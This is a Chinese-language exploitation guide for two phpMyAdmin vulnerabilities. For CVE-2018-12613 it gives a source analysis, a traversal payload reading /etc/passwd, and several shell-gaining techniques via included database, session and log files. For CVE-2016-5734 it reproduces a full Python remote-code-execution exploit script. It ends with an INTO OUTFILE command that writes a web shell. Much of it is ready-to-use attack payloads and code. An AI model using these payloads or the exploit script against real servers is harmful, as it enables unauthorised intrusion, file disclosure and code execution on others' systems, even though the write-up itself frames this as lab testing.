### CVE-2018-12613（远程文件包含）

**影响版本**

```
4.8.1——4.8.0
```

漏洞出现在**index.php**，大概在第55行

```php
// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

**$_REQUEST['target']**获得参数，进行5个判断

```php
! empty($_REQUEST['target'])
```

**target**是否为空，传参数就可以绕过

```php
is_string($_REQUEST['target'])
```

**target**值是否为字符串，GET和POST接收值默认为字符串，即可绕过

```php
! preg_match('/^index/', $_REQUEST['target'])
```

接收字符串不准以**index**开头，开头不写就可以

```php
 ! in_array($_REQUEST['target'], $target_blacklist)
// $target_blacklist大概在index.php的第50行，也就在判断的上面
$target_blacklist = array (
    'import.php', 'export.php'
);
```

包含文件不能在**$target_blacklist**数组里面，避开就可以

```php
 Core::checkPageValidity($_REQUEST['target'])
```

这里的静态调用**Core::checkPageValidity**跟进一下

大概在**core.php**的第443行

```php
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }

    if (in_array($page, $whitelist)) {
        return true;
    }

    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    return false;
}
```

第一个判断

```php
if (empty($whitelist)) {
    $whitelist = self::$goto_whitelist;
}
```

这里开始并没有传值，所以为空，进行跟进**self::$goto_whitelist**

大概在本文件的第31行

```php
public static $goto_whitelist = array(
    'db_datadict.php',
    'db_sql.php',
    'db_events.php',
    'db_export.php',
    'db_importdocsql.php',
    'db_multi_table_query.php',
    'db_structure.php',
    'db_import.php',
    'db_operations.php',
    'db_search.php',
    'db_routines.php',
    'export.php',
    'import.php',
    'index.php',
    'pdf_pages.php',
    'pdf_schema.php',
    'server_binlog.php',
    'server_collations.php',
    'server_databases.php',
    'server_engines.php',
    'server_export.php',
    'server_import.php',
    'server_privileges.php',
    'server_sql.php',
    'server_status.php',
    'server_status_advisor.php',
    'server_status_monitor.php',
    'server_status_queries.php',
    'server_status_variables.php',
    'server_variables.php',
    'sql.php',
    'tbl_addfield.php',
    'tbl_change.php',
    'tbl_create.php',
    'tbl_import.php',
    'tbl_indexes.php',
    'tbl_sql.php',
    'tbl_export.php',
    'tbl_operations.php',
    'tbl_structure.php',
    'tbl_relation.php',
    'tbl_replace.php',
    'tbl_row_action.php',
    'tbl_select.php',
    'tbl_zoom_select.php',
    'transformation_overview.php',
    'transformation_wrapper.php',
    'user_password.php',
)
```

因此

```php
$whitelist = array(
    'db_datadict.php',
    'db_sql.php',
    'db_events.php',
    'db_export.php',
    'db_importdocsql.php',
    'db_multi_table_query.php',
    'db_structure.php',
    'db_import.php',
    'db_operations.php',
    'db_search.php',
    'db_routines.php',
    'export.php',
    'import.php',
    'index.php',
    'pdf_pages.php',
    'pdf_schema.php',
    'server_binlog.php',
    'server_collations.php',
    'server_databases.php',
    'server_engines.php',
    'server_export.php',
    'server_import.php',
    'server_privileges.php',
    'server_sql.php',
    'server_status.php',
    'server_status_advisor.php',
    'server_status_monitor.php',
    'server_status_queries.php',
    'server_status_variables.php',
    'server_variables.php',
    'sql.php',
    'tbl_addfield.php',
    'tbl_change.php',
    'tbl_create.php',
    'tbl_import.php',
    'tbl_indexes.php',
    'tbl_sql.php',
    'tbl_export.php',
    'tbl_operations.php',
    'tbl_structure.php',
    'tbl_relation.php',
    'tbl_replace.php',
    'tbl_row_action.php',
    'tbl_select.php',
    'tbl_zoom_select.php',
    'transformation_overview.php',
    'transformation_wrapper.php',
    'user_password.php',
)
```

第二个判断

```php
 if (! isset($page) || !is_string($page)) {
        return false;
 }
```

**$page**不为空，**$page**是字符串，开始在index.php的时候已经绕过了

第三个判断

```php
 if (in_array($page, $whitelist)) {
        return true;
 }
```

包含文件要在**$whitelist**

接下来是重点

```php
$_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
);
if (in_array($_page, $whitelist)) {
    return true;
}
```

**$_page**获得第一个问号前面所有字符，比如

```php
abcd.php?a=123
```

那么

```php
$_page = "abcd.php";
```

然后判断**$_page**是否在**$​whitelist**里面，是就返回TRUE

这里开发者的意图应该是认为**$_REQUEST"[target"]**只会接受xxx.php，怕你们连问号都不加，自己在后面加了个再**判断第一个问号**出现的位置，在截取，然后完美得到xxx.php。

```php
mb_strpos($page . '?', '?')		#$page . '?'
```

可惜这里变成了漏洞利用的关键

漏洞测试

Payload

```url
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../etc/passwd
```

![1566786346179](images\1566786346179.png)

这里问号前面的文件在**$whitelis**里面即可绕过判断

```php
db_sql.php?/../../../../../../../../etc/passwd
```

问号后面加 **/** 让服务器认为前面的**db_sql.php?**是文件夹，再在后面加上 **../** ，达到目录穿越，再包含。

那么如何**Getshell**呢

**1、包含数据库文件**

先查看当前数据库路径

```shell
show variables like '%datadir%'
```



![1566792705398](images\1566792705398.png)

在数据库下创建表，（linux权限限制严格，普通用户一般不能创建数据库，但大多数可以建表）。

创建一个字段包含一句话木马的表

![1566792339344](images\1566792339344.png)

![1566792396814](images\1566792396814.png)

直接包含数据文件

```url
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../var/lib/mysql/data/test/my.frm
```

有的没有data这一层目录

```
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../var/lib/mysql/test/my.frm
```

即可看到phpinfo界面

**2、包含session文件**

这个基本是最简单的思路，P牛出品，比属精品

首先先执一个sql语句（写上你要执行的php代码）

```
select '<?php phpinfo(); ?>'
```

然后包含session文件

```
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../tmp/sess_f34d823b1d617613d799166ac381b720
```

或者

```
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../tmp/tmp/sess_f34d823b1d617613d799166ac381b720
```



![1566798007400](images\1566798007400.png)

即可执行php代码

session文件名可以在cookie里面找到

![1566798295510](images\1566798295510.png)

注意在这之前不要写入过多的php代码，不然会出现语法错误之类的，导致不能正常执行。

最好保证session文件里只有一句php代码，成功率高

**3、包含log文件**

这个技巧因为linux权限问题，限制有点大，可能因权限不够而失败

可以查看是否开启

```
show variables like '%general%'
```

![1566798538824](images\1566798538824.png)

**general_log = off**表示没有开启，**general_log_file**是日志路径

没有开启可以使用

```sql
SET GLOBAL general_log='on'
```

同时也可以更改日志文件路径

```sql
SET GLOBAL general_log_file='xxx/xxx/xxx'
```

但如果权限不够，可能无法执行，像我这样

![1566798776746](images\1566798776746.png)

假设权限足够可以继续执行sql语句

```
select '<?php phpinfo(); ?>'
```

写入日志文件

再包含

```
http://127.0.0.1:8080/index.php?target=db_sql.php?/../../../../../../../../var/lib/mysql/e11ed353cc0b.log
```

这个主要使用于日志记录功能已开启，没有修改的权限，并且知道日志路径，才能包含成功。

如果可以修改也能够直接getshell，不需要包含。

**4、包含上传的sql文件**

这个利用前提是你知道上传sql文件地址，否则不能包含成功。

这里不在赘述。

---

### CVE-2016-5734

出现这个漏洞的PhpMyAdmin版本久远，php也是古董版本，并且利用条件苛刻，碰见应该几率很小。

**利用前提**

```
授权用户 ·#可以登录phpmyadmin，并读写
phpmyadmin 4.0.x———4.0.10.16 && 4.4.x---4.4.15.7
php 4.6.x--4.6.3
```

在tbl_find_replace.php文件的第23行

```php
if (isset($_POST['find'])) {
    $preview = $table_search->getReplacePreview(
        $_POST['columnIndex'],
        $_POST['find'],
        $_POST['replaceWith'],
        $_POST['useRegex'],
        $connectionCharSet
    );
    $response->addJSON('preview', $preview);
    exit;
}
```

跟进**getReplacePreview**，在TableSearch.class.php的第1429行，部分代码

```php
function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex,
        $charSet
    ) {
        $column = $this->_columnNames[$columnIndex];
        if ($useRegex) {
            $result = $this->_getRegexReplaceRows(
                $columnIndex, $find, $replaceWith, $charSet
            );
```

得到表的名字

```php
$column = $this->_columnNames[$columnIndex];
```

继续跟进**_getRegexReplaceRows**，大概在本文件的1388行

```php
    function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this->_columnNames[$columnIndex];
        $sql_query = "SELECT "
            . PMA_Util::backquote($column) . ","
            . " 1," // to add an extra column that will have replaced value
            . " COUNT(*)"
            . " FROM " . PMA_Util::backquote($this->_db)
            . "." . PMA_Util::backquote($this->_table)
            . " WHERE " . PMA_Util::backquote($column)
            . " RLIKE '" . PMA_Util::sqlAddSlashes($find) . "' COLLATE "
            . $charSet . "_bin"; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= " GROUP BY " . PMA_Util::backquote($column)
            . " ORDER BY " . PMA_Util::backquote($column) . " ASC";

        $result = $GLOBALS['dbi']->fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=>$row) {
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }
```

因为在**PHP5.4.7**以前的pre_replace的第一个参数可以进行**00截断**，改成**\e模式**，执行代码。

在**_getRegexReplaceRows**中的

```php
if (is_array($result)) {
    foreach ($result as $index=>$row) {
        $result[$index][1] = preg_replace(
            "/" . $find . "/",
            $replaceWith,
            $row[0]
        );
    }
}
```

**\$find（\$_POST["find"]，\$columnIndex（\$_POST["columnIndex"]），$replaceWith（\$_POST['replaceWith']）**都是可控的，导致前面的查询操作都是可控的。

先一开始写一张表，字段值写上**"0/e"**

最后构造这样就可以

```php
$find = "0/e";
$fromsqldata  = "0/e";
//preg_replace("/" . $find . "/", $replaceWith, $row[0] );
preg_replace("/" . $find . "\0/", $_POST['replaceWith'], $fromsqldata );
```

执行任意代码

但利用前需要**token**和对数据的读写操作，有些复杂，但是有[POC](https://www.exploit-db.com/exploits/40185)

```PYTHON
#!/usr/bin/env python

"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
CVE: CVE-2016-5734
Author: https://twitter.com/iamsecurity
run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
"""

import requests
import argparse
import sys

__author__ = "@iamsecurity"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="URL with path to PMA")
    parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")
    parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA user")
    parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for valid PMA user")
    parser.add_argument("-d", "--dbs", type=str, help="Existing database at a server")
    parser.add_argument("-T", "--table", type=str, help="Custom table name for exploit.")
    arguments = parser.parse_args()
    url_to_pma = arguments.url
    uname = arguments.user
    upass = arguments.pwd
    if arguments.dbs:
        db = arguments.dbs
    else:
        db = "test"
    token = False
    custom_table = False
    if arguments.table:
        custom_table = True
        table = arguments.table
    else:
        table = "prgpwn"
    if arguments.cmd:
        payload = arguments.cmd
    else:
        payload = "system('uname -a');"

    size = 32
    s = requests.Session()
    # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)

    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    if token is False:
        print("Cannot get valid authorization token.")
        sys.exit(1)

    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")]
                    if "already exists" in error:
                        print(error)
                    else:
                        print("ERROR: " + error)
                        sys.exit(1)
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:]
        if len(result):
            print("result: " + result)
            sys.exit(0)
        print(
            "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp"
        )
        sys.exit(1)
            
```

直接利用测试

![1566824490470](images\1566824490470.png)

执行成功

---

### 其他

如果是权限足够，Getshell就是一件很简单的事情了。

权限足够，直接在sql界面执行语句便可

```
select '<?php phpinfo(); ?>' into outfile '/var/www/html/shll.php';
```

直接把shell打进行网站目录

### 参考链接